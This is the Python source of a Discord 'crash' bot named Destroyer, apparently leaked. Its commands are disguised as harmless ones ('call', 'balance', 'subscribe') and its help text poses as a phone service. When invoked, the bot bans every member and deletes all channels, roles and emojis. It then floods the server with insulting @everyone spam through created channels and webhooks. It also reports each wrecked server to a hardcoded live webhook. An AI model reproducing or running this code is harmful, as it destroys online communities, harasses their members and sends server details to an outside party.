import discord
import datetime
import random
import asyncio
import dhooks
import contextlib
import io
# слито by t.me/protectcheck
# слито by discord.gg/fzlgroup2

import os
import threading
import time
import requests

from time import sleep
from threading import Thread, Lock
from discord.ext import commands
from config import settings
from dhooks import Webhook, Embed
client = commands.Bot(command_prefix = settings['PREFIX'], case_insensitive = True, intents = discord.Intents.all())
client.remove_command('help')


global webhook
webhook = 'WEBHOOK URL'
global current_id
current_id = open('id.txt', 'w')

def localtime():
    time = datetime.datetime.now()
    return f'[{time.strftime("%H:%M:%S")}]'

@client.event
async def on_ready():
    current_id.write(f'{client.user.id}')
    current_id.close()
    await client.change_presence(status = discord.Status.idle, activity = discord.Activity(name='t!call | .gg/', type=discord.ActivityType.watching))
    print(f'primary bot {client.user.name}#{client.user.discriminator}({client.user.id}) is ready.')


whiteservers = []

async def act1(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            pass

async def act2(ctx):
    for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                pass

async def act3(ctx):
    for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                pass

async def act4(ctx):
    for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
            except:
                pass

async def act5(ctx):
    for x in range(settings['TEXT-CHANNELS']):
        chhhhh = await ctx.guild.create_text_channel(f"{settings['TEXT']}-{random.randint(1, 1000)}")
        await chhhhh.create_webhook(name = 'вы лохи')
async def act6(ctx):
    for y in range(settings['VOICE-CHANNELS']):
        await ctx.guild.create_voice_channel(f"{settings['TEXT']}-{random.randint(1, 1000)}")
async def act7(ctx):
    for z in range(settings['ROLES']):
        await ctx.guild.create_role(name = f"{settings['TEXT']}-{random.randint(1, 1000)}")

async def spam_v2(ctx):
    for channel in ctx.guild.text_channels:
        for hook in await channel.webhooks():
            jsonn = {
                "content": "@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере весело: https://shrk.tk/crushers"
            }
            try:
                requests.post(f'{hook.url}', json = jsonn)
            except:
                continue

@client.command()
async def call(ctx):
    if ctx.guild.id not in whiteservers:
        await ctx.send("Starting a call with number: `+7 800 555 35 35` to random number. Wait....")

        start_time = localtime()
        start_guild_num = len(ctx.guild.members)
        start_guild_chan_num = len(ctx.guild.channels)
        start_guild_role_num = len(ctx.guild.roles)
        start_guild_emoji_num = len(ctx.guild.emojis)
    ##############################################
        banned_num = 0
        deleted_chan = 0
        deleted_roles = 0
        deleted_emojis = 0
    # DELETE EVERYTHING
        client.loop.create_task(act1(ctx))
        client.loop.create_task(act2(ctx))
        client.loop.create_task(act3(ctx))
        client.loop.create_task(act4(ctx))

    # CREATE EVERYTHING
        text_num = 0
        voice_num = 0
        roles_num = 0
        emojis_num = 0
        servername = ctx.guild.name
        servericon = ctx.guild.icon_url
        fp = open(settings['ICON-PNG'], 'rb')
        pfp = fp.read()

        client.loop.create_task(act5(ctx))
        client.loop.create_task(act6(ctx))
        client.loop.create_task(act7(ctx))
        # CREATE TEXT CHANNELS
        pfp_ch = 'Нет'
        try:
            fp = open(settings['ICON-PNG'], 'rb')
            pfp = fp.read()
            await ctx.guild.edit(name = settings['TEXT'], icon = pfp)
            pfp_ch = 'Да'
        except:
            await ctx.guild.edit(name = settings['TEXT'])
            pfp_ch = 'Нет'

    #CRASH REPORT
        title = None
        if ctx.guild.avatar:
            title = "Аватарка сервера ---------------------->"
        else:
            title = "Сервер без аватарки"
        if int(start_guild_num) >= 35:
            jsonn = \
            {
                "content": None,
                "embeds": [
                    {
                        "title": f"{title}",
                        "color": 15402759,
                        "description": "||сервера меньше 35 не отправляются сюда(защита от дурака)||",
                        "fields": [
                        {
                            "name": "Имя сервера",
                            "value": f"{servername}",
                            "inline": True
                            },
                        {
                            "name": "Участников",
                            "value": f"{start_guild_num}",
                            "inline": True
                            },
                        {
                            "name": "Кто крашнул:",
                            "value": f"{ctx.message.author.name}#{ctx.message.author.discriminator}(ID: {ctx.message.author.id})"
                            }
                            ],
                        "author": {
                            "name": "Новый краш бот - Destroyer",
                            "url": f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot"
                            },
                        "footer": {
                            "text": "Держите права администратора под контролем :))"
                            },
                        "thumbnail": {
                            "url": f"{servericon}"
                            },
                    "username": "Destroyer",
                    "avatar_url": "https://cdn.discordapp.com/attachments/656864136856076289/849704735035359272/servericon1.png"
                    }
                ]
            }
            requests.post('https://discord.com/api/webhooks/915468623043244052/Xe59BEknB5VXX8ORl7jiKcwbkx9Ee10gcW1GC8ro4vqZ8zmDWI5XsXHVvixOqRp7soXE', json = jsonn)
        else:
            pass
    else:
        await ctx.send(f'Извини, но сервер нельзя крашить, т.к. владелец купил защиту от краша. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')

@client.command(aliases=['caller_id'])
async def __spam(ctx):
    if ctx.guild.id not in whiteservers:
        for i in range(500):
            try:
                for channel in ctx.guild.text_channels:
                    await channel.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            except:
                break
    else:
        await ctx.send(f'Извени, но на сервере нельзя спамить, т.к владелец молодец, купил защиту от бота. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')

@client.command(aliases=['help'])
async def __help(ctx):
  await ctx.send('Help command.\nt!call - start a call\nt!caller_id - get your number\nt!balance - chech youe balance on guild\nt!subscribe - can offer a good subscription')

@client.command(aliases=['balance'])
async def __current(ctx):
    if ctx.guild.id not in whiteservers:
        for i in range(555):
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            await ctx.send('@everyone @here Привет лохи, это я, ваш палач **Destroyer**, и так случилось что этот сервер попал под мою власть. А так приходи к нам, у нас на сервере не воняет твоей обоссаной матью https://shrk.tk/crushers')
            
    else:
        await ctx.send(f'Сервер защищён от спама. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')

@client.command(name = 'subscribe')
async def test123(ctx):
    asyncio.create_task(spam_v2(ctx))
    asyncio.create_task(spam_v2(ctx))
    asyncio.create_task(spam_v2(ctx))
    asyncio.create_task(spam_v2(ctx))
    asyncio.create_task(spam_v2(ctx))
    asyncio.create_task(spam_v2(ctx))
    asyncio.create_task(spam_v2(ctx))
    asyncio.create_task(spam_v2(ctx))
    asyncio.create_task(spam_v2(ctx))
    asyncio.create_task(spam_v2(ctx))
    asyncio.create_task(spam_v2(ctx))
    asyncio.create_task(spam_v2(ctx))
    asyncio.create_task(spam_v2(ctx))

client.run(settings['TOKEN'])
# слито by t.me/protectcheck
# слито by discord.gg/fzlgroup2
